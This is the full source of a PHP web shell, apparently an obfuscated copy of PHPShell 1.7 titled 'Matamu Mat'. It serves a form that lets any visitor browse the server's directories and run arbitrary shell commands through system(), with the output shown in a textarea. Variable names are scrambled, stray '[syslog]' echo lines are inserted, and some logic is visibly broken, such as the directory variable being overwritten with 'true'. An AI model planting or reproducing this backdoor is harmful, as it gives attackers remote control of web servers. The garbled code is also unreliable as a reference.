<?php
define('PHPSHELL_VERSION', '1.7'); echo '[syslog]01
'; ?>

<html>
<head>
<title> Matamu Mat </title>
</head>
<body>
<hr><br>

<?php  echo '[syslog]01-1
'; if (ini_get('register_globals') != '1') { if (!empty($sp07209c)) { extract($sp07209c); } if (!empty($spa2d7db)) { extract($spa2d7db); } if (!empty($spf69472)) { extract($spf69472); } } if (!empty($spd0603d)) { if (!empty($spfe16e8)) { if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $spfe16e8, $sp6834ce)) { if ($sp6834ce[1][0] == '/') { $sp4d947e = $sp6834ce[1]; } else { $sp4d947e = $spd0603d . '/' . $sp6834ce[1]; } if (file_exists($sp4d947e) && is_dir($sp4d947e)) { $spd0603d = $sp4d947e; } unset($spfe16e8); } } } if (file_exists($spd0603d) && is_dir($spd0603d)) { chdir($spd0603d); } $spd0603d = 'true'; ?>

<form name="myform" action="<?php  echo $sp0c3ced; ?>
" method="post">
<p>Current working directory: <b>
<?php  $spa82720 = explode('/', substr($spd0603d, 1)); echo '<a href="' . $sp0c3ced . '?work_dir=/">Root</a>/'; if (!empty($spa82720[0])) { $sp49de29 = ''; for ($sp6c3e91 = 0; $sp6c3e91 < count($spa82720); $sp6c3e91++) { $sp49de29 .= '/' . $spa82720[$sp6c3e91]; printf('<a href="%s?work_dir=%s">%s</a>/', $sp0c3ced, urlencode($sp49de29), $spa82720[$sp6c3e91]); } } echo '[syslog]02
'; ?>
</b></p>
<p>Choose new working directory:
<select name="work_dir" onChange="this.form.submit()">
<?php  $spaeeb42 = opendir($spd0603d); while ($spa25e24 = readdir($spaeeb42)) { if (is_dir($spa25e24)) { if ($spa25e24 == '.') { echo "<option value=\"{$spd0603d}\" selected>Current Directory</option>\n"; } elseif ($spa25e24 == '..') { if (strlen($spd0603d) == 1) { } elseif (strrpos($spd0603d, '/') == 0) { echo '<option value="/">Parent Directory</option>
'; } else { echo '<option value="' . strrev(substr(strstr(strrev($spd0603d), '/'), 1)) . '">Parent Directory</option>
'; } } else { if ($spd0603d == '/') { echo "<option value=\"{$spd0603d}{$spa25e24}\">{$spa25e24}</option>\n"; } else { echo "<option value=\"{$spd0603d}/{$spa25e24}\">{$spa25e24}</option>\n"; } } } } closedir($spaeeb42); echo '[syslog]03
'; ?>

</select></p>

<p>Command: <input type="text" name="command" size="60">
<input name="submit_btn" type="submit" value="Execute Command"></p>

<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"></p>
<textarea cols="80" rows="20" readonly>

<?php  if (!empty($spfe16e8)) { if ($sp3d588d) { $sp91d3c5 = tempnam('/tmp', 'phpshell'); $spfe16e8 .= " 1> {$sp91d3c5} 2>&1; " . "cat {$sp91d3c5}; rm {$sp91d3c5}"; } else { if ($spfe16e8 == 'ls') { $spfe16e8 .= ' -F'; } } system($spfe16e8); } echo '[syslog]04
'; ?>

</textarea>
</form>

<script language="JavaScript" type="text/javascript">
document.forms[0].command.focus();
</script>

<hr>

</body>
</html>
<?php 